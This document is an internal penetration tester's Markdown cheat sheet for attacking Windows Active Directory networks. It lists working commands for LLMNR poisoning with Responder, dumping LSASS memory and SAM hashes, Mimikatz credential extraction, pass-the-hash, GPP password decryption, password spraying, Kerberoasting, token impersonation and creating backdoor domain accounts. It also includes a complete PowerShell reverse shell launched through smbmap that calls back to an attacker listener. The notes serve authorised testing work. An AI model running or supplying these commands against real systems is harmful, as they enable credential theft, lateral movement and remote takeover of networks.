# Internal-Testing
Notes for internal testing


# Internal Pentest Tools & Techniques

## Responder
- Analyze Mode:  
    - `sudo responder -I eth0 -A`
- Basic Mode (with fingerprinting)
    - `sudo responder -I eth0 -f -v`
- WPAD Proxy Mode (with fingerprinting):
    - `sudo responder -I eth0 -wf`
- Aggressive Mode (use caution):
    - `sudo responder -I eht0 -wrdf`
- MultiRelay
    - https://github.com/lgandx/Responder/wiki/MultiRelay

## Bloodhound
- Run the python ingestor to remotely collect "all" data
    - `python3 bloodhound.py -c ALL -u username -p password -d example.local`
- (Optional) Bloodhound comes built-in with Sharphound to collect data
    - Often gets caught by AV
- Zip all files when the pyingestor completes
    - `zip data.zip *.json`
    - Drag & drop zip file to neo4j console to populate graphs
- **Edges** & how to exploit discovered relationships
    - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
- Parsing Bloodhound Data via Terminal/jq - https://youtu.be/o3W4H0UfDmQ
    - Retreive all group names and descriptions
        - `cat groups.json | jq '.groups[].Properties | .name + "|" + .description'`
    - Retreive all enabled users and descriptions
        - `cat users.json | jq '.users[].Properties | select( .enabled == true) | .name + "|" + .description'`
    - Retrieve all domain controllers (by Description field - if this hasn't been filled in by the org, may be inaccurate)
        - `cat computers.json | jq '.computers[].Properties | select( .description == "Domain Controller" ) | .name + " | " + .description'`
            - The Properties key may be different based on which version of bloodhound injestor you are running (instead of 'computers' or 'users'). Run `cat [file].json | jq keys` to obtain all keys 
## Sysinternals
### PSExec
- Connect to a remote machine and open a cmd.exe shell
    - `.\PSexec64.exe -accepteula \\servername -u example.local\username -p password cmd.exe`
- If your user has local admin on the machine you are connecting to, you can run PSExec with the `-s` flag to "do this as SYSTEM"
    - `.\PSexec64.exe -accepteula \\servername -u example.local\username -p password -s cmd.exe`
### Procdump
- Run Procdump to dump process memory (usually LSASS process memory)
    - `-ma` "Write a 'Full' dump file."
    -  `.\procdump64.exe -accepteula -ma lsass.exe out.dmp`
    - If an error occurs, try adding the `-r` flag
    - `-r` "Dump using a clone."
    -  `.\procdump64.exe -accepteula -r -ma lsass.exe out.dmp`

Download the full Sysinternals Suite here: https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite  
Download individual Sysinternals tools from Sysinternals Live: https://live.sysinternals.com/  

## lsassy
- Remote lsass dumps
- https://github.com/Hackndo/lsassy
- `lsassy -d example.local -u username -p password <IP_address>`
- `lsassy -d example.local -u username -H <NT_Hash> <IP_address>` 
    - Supports pass-the-hash

## Mimikatz
- Run mimikatz
    - `.\mimikatz.exe`
- Choose the minidump sekurlsa module using LSASS.exe output from procdump
    - `sekurlsa::minidump out.dmp`
- Search the output for passwords
    - `sekurlsa::logonPasswords`
- Notes on hashes
    - Windows hashes will usually be in the format LM:NTLM
    - If an LM hash = `aad3b435b51404eeaad3b435b51404ee`, only the NTLM hash is being used
    - If Mimikatz only returns an NTLM hash, the value above can be prepended if LM:NTLM is required in pass-the-hash (PTH) attacks
    - If an LM hash is ever not the value above, the LM hash is in use and can be cracked separately

## SAM Database
- Retrieve the SAM and SYSTEM registry key files
    - `reg save HKLM\SAM C:\temp\sam.reg`
    - `reg save HKLM\SYSTEM C:\temp\system.reg`
- Run samdump2 on linux to read the SAM database
    - `samdump2 system.reg sam.reg`

## Domain Controllers
### Identifying DCs
- `nslookup`
- `> set type=all`
- `> _ldap._tcp.dc._msdcs.example.local`

### (Optional) Mount SYSVOL
- `net use Z: \\DC01\sysvol`

### Search for "cpassword" using findstr over GPP files
- `/s` "Searches the current directory and all subdirectories."
- `/i` "Ignores the case of the characters when searching for the string."
- (View all findstr syntax [here](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)!)
    - `findstr /s /i cpassword *.xml`
    - `findstr /s /s "cpassword" *.xml`
- For any hits on "cpassword," decode the string with Kali's `gpp-decrypt` tool to reveal the account's plaintext password
    - https://attack.mitre.org/techniques/T1552/006/

## enum4linux
- Use enum4linux to enumerate Windows systems from Kali
    - Requires the Samba package; this is essentially a wrapper around smbclient, rpcclient, net, nmblookup, and other tools
    - `enum4linux -v -a <IP_address>` Runs "all" options, with verbose
    - By default, enum4linux will try to use a username of "" and a password of "" to attempt to enumerate via anonymous sessions
    - Generally, target domain controllers to try to collect information about the domain
- If able to retrieve a user list from the domain, try password spraying next!

## CrackMapExec
- Use CME to dump LSA secrets from the target system "hostname01"
    - `cme smb hostname01 -u username -p password -d example.local --lsa`
- Use CME to password spray (try a **few** weak passwords with many usernames, careful to prevent account lockout)
    - `crackmapexec smb 10.10.10.0/24 -d example.local -u /tmp/userlist.txt -p Winter2021!`

## SMBMap
- Basic usage to find open shares on a list of hosts
    - `smbmap --host-file ~/Desktop/HostList.txt -d example.local`
- Use with creds for more visibility
    - WARNING: This _might_ print things?? (Consider filtering out printers from your host list, if this info is available from Nessus)
    - `smbmap --host-file ~/Desktop/HostList.txt -d example.local -u exampleuser -p password123`
- Get a reverse shell with SMBMap
    - Netcat listener
        - `nc -nvlp 4445`
    - Be sure to change the IP in the command (variable $a) to your listener IP
        ```
        smbmap -u username -p password -d example.local -H 192.168.0.1 -s C$ -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
        ```
- Other SMBMap tips
    - https://github.com/ShawnDEvans/smbmap

## File Transfers
- Host a file or directory using a python webserver
    - `python -m SimpleHTTPServer`
    - `python3 -m http.server`
- Retrieve a file hosted on a python webserver using curl
    - `curl 192.168.0.1:8000/file.exe --output file.exe`
- Share out a folder on the source machine, then map that folder as a drive on the destination machine
    - Remember to unshare folders and unmap drives when finished
- It's okay to use simple methods, if applicable
    - SharePoint
    - ShareFile
    - Emailing a file to yourself
    - Use caution with third party software (Slack, Dropbox, etc.)
        - Don't forget we are handling sensitive information!
        - Cloud storage (besides O365) may not be in scope 
    - NEVER use Gist, Pastebin, etc. to transfer client data. This is made public to the internet!

## Basic Bash Loops
- Create a host list where each line is an IP address ending 1 - 254
    - `for octet in {1..254}; do echo 192.168.1.$octet >> ~/Desktop/HostList.txt; done`
- Loop through a host list and run a certain tool
    - `for ip in $(cat ~/Desktop/HostList.txt); do nslookup $ip; done`

## PowerShell "Living off the Land"
- Ping sweep
    - `1..255 | % {ping -n 1 10.10.10.$_ | sls ttl}`
- Port scan
    - `1..1024 | % {echo "Testing port $_"; echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open" } 2>$null`
- Check for stored wireless PSKs
    - Method 1
        ```
        (netsh wlan show profiles) `
            | Select-String “\:(.+)$” `
            | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} `
            | %{(netsh wlan show profile name=”$name” key=clear)} `
            | Select-String “Key Content\W+\:(.+)$” `
            | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} `
            | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} `
            | Format-Table -AutoSize
        ```
    - Method 2
        - `netsh wlan export profile key=clear`
        - Review the output .xml files, PSK is in "keyMaterial" tag
## Kerberoasting
- Use impacket's GetUserSPNs to query target domain for SPNs that are running under a user account
    - `./GetUserSPNs.py example.local/username:password -outputfile hashes.kerberoast`

## Incognito
- Must be local admin. Impersonate a user via their token if they have an active session on the machine you are on
- Used via incognito.exe or Incognito Meterpreter add-on
- In a Meterpreter session:
    - `use incognito` - Load the module
    - `list_tokens -u` - List available tokens
    - `impersonate_token DOMAIN\\DomainAdmin_DA` - Impersonate a user. Usually needs "Delegation Token"
    - `shell` - Drop into a shell, run `whoami` to see you are now domain admin
- Notes
    - If you need to "hunt" a Domain Admin active sessions across multiple compromised machines
    - Metasploit: "auxiliary/scanner/smb/smb_enumusers_domain" 
    - Incognito: "find_tokens.exe"
- https://akimbocore.com/article/privilege-escalation-with-incognito/

## Unquoted Service Paths
- Can be used to locally escalate privileges under the right circumstances. 
- You need to be able to write to a directory that has a space in the path, that is not enclosed in quotes
- Find unquoted service paths
    - `wmic service get name,pathname`
    - `wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v ""C:\Windows\\" | findstr /i /v ""`
- View what starts the service
    - `wmic service get pathname,startname`
- Tutorial here
   - https://gracefulsecurity.com/privesc-unquoted-service-path/

## FTP Command Execution
- In Windows (and maybe Unix?) FTP allows command execution by prepending the command with `!`
- e.g. 
    - `ftp> !ipconfig`
    - `ftp> !whoami` 
- Other notes on 'Desktop Breakout' here
    - https://gracefulsecurity.com/windows-desktop-breakout/

## Windows Command Line
- `ipconfig /all` - View verbose IP info
- `set` - View ENV variables (such as internal domain)
- `set user` - View user ENV variables
- `set l` - View ENV variables starting with "L" 
- `whoami /priv` - User SE privileges
- `whoami /user` - SID
- `whoami /groups` - Groups
- `whoami /all` - Privs, SID, and groups
- `gpresult /V` - Verbose user info, includes groups
- `net help` - View help for the "net" command
- `net use` - View drive mappings
- `net share temp=c:\users\exampleuser\temp` - Share out a local folder
- `net share temp /delete` - Stop sharing a local folder
- `net use Z: \\server01\share` - Map remote share to Z: drive
- `net use Z: /delete` - Unmap remote share
- `net localgroup` - View local groups
- `net localgroup administrators` - View local admins
- `net group /domain` - View domain groups (runs on DC)
- `net group "domain admins" /domain` - View domain admins
- `net user` - View local users
- `net user exampleuser password123 /add` - Create **local** user 'exampleuser' with password 'password123'
- `net localgroup administrators exampleuser /add` - Add local user 'exampleuser' to local admins
- `net user examplebackdoor password123 /add /domain` - Create a new **domain** user
- `net group privdgroup examplebackdoor /add /domain` - Add a domain user 'examplebackdoor' to a domain group 'privdgroup'
- `runas /user:examplebackdoor@pwndomain.local cmd.exe` - Start cmd.exe as another user
- `netstat -na` - View active and listening connections
- `net accounts` - View local account lockout policy
- `net accounts /domain` - View domain account lockout policy

## NFS Shares (Unix Shares)
- Typically on port 2049
- `sudo showmount -e 10.10.10.10` - Show which folders are mountable on a host
- `mkdir /mnt/tempshare` - Make the destination folder where the share will be mounted
- `mount -t nfs [-o vers=2] 10.10.10.10:/home/nfsshare /mnt/tempshare -o nolock` - Mount the share
    - Recommended to use version 2 because authentication is not required
- `mount -t nfs 10.10.10.10:/home/nfsshare /mnt/tempshare` - Alternate mount option
- `cd /mnt/tempshare` - Navigate to mounted share. Search for sensitive files, writable directories, etc.
- `umount /mnt/tempshare` - Unmount the NFS share 
- `umount -f -l /mnt/tempshare` - Use `-f` and `-l` if necessary
    - `-f` Force unmount (in case of an unreachable NFS system). (Requires kernel 2.1.116 or later.)
    - `-l` Lazy unmount. Detach the filesystem from the filesystem hierarchy now, and cleanup all references to the filesystem as soon as it is not busy anymore (Requires kernel 
- More resources available here:
    - https://book.hacktricks.xyz/pentesting/nfs-service-pentesting

## PowerSploit & PowerView
Github Repos (includes cmdlet help):
- PowerSploit
    - https://github.com/PowerShellMafia/PowerSploit  
- PowerView (Recon folder) 
    - https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon  

Cheat Sheets:
- harmj0y (author) Notes:
    - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
- High-level (somewhat easier) examples:
    - https://burmat.gitbook.io/security/hacking/domain-exploitation

To install **PowerSploit**:
- Clone the full PowerSploit repo into a directory on your Windows machine (e.g. I use `C:\Tools\PowerSploit`)
- Copy the PowerSploit folder to `C:\Windows\System32\WindowsPowerShell\v1.0\Modules\`
- Open PowerShell as administrator and run
    - `Set-ExecutionPolicy -ExecutionPolicy Unrestricted`
    - Select 'Yes to All'
    - This will let you execute the PowerSploit scripts without hassle
- Run `Import-Module PowerSploit`
- Use PowerShell ISE and filter Modules by PowerSploit to view available commands

To install **PowerView** (above steps must be completed first):
- From your cloned repo, copy the Recon folder (e.g. `C:\Tools\PowerSploit\Recon`)
- Copy the recon folder to `C:\Windows\System32\WindowsPowerShell\v1.0\Modules\`
- Open PowerShell as administrator and run
    - `Import-Module Recon`
- Verify PowerView has installed by viewing the Modules in PowerShell ISE

## Local Windows Privilege Escalation (Priv Esc)
Basic Methodology
1. Enumerate the current user's privileges and resources it can access
2. Run an automated enumeration script
    - winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
    - Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
    - PowerUp.ps1: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
3. If unsuccessful (e.g. AV prevents enumeration), review checklist items
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

## Eyewitness (Web Server Enumeration)
Eyewitness is a tool used to capture screenshots from a list of URLS.
By Default, Eyewitness attempts to screenshot web servers hosted on port 80.
- To scan a single http URL: `eyewitness --web --single [url]`
- To scan a url with http and https: `eyewitness --web --single [url] --prepend-https`
Eyewitness allows for us to use input files! (.txt, .xml, and .Nessus files are supported)

    **.txt files**
    
        `eyewitness --web -f [path to input file] --prepend-https`
        **Note:** If using a .txt file, ensure that all hosts are followed by the port you wish to scan. (e.g. `10.0.0.10:80`, `10.0.0.10:443`, `10.0.0.8080`, etc.)
        
    **.xml or .Nessus files**
    
        `eyewitness --web -x [path to file] --prepend-https`


## Sensitive Data Scanning (Powershell Script)
- If scanning shares, you have to mount the share, then scan
    - `net use X: \\[share IP/hostname]\[sharename]`
    - Enter credentials

## Brute Forcing Domain User Credentials (Using crackmapexec)
### Pay close attention when conducting bruteforce attacks. Failure to take proper precautions may lead to mass denial of account use
- First, ensure you have a list of domain users
    - enum4linux
    - bloodhound
    - Get-ADUser
- Next, ensure that list of users is sorted and duplicates are removed
    - Can be done in excel, bash, or other methods
        - CAUTION: If using bash's `uniq` command, duplicates will only be removed only if the list is sorted!
- Create a file on attack machine with all domain users you wish to bruteforce
- Command used to brute force 1 password against a list of hosts
    - `crackmapexec smb [DC IP] -d [domain] -u [usernames] -p [password you wish to bruteforce with] --continue-on-success`
        - Utilizing information from the password policy is ideal
            - Password minimum length
            - Account lockout threashold
        - Pending the account lockout time and attempts, bruteforce attacks should be limited. (Example: A password lockout of 5 failed attempts in 30 minutes should allow for 2 attempts every 30 minutes or longer. This will allow some space for user error)
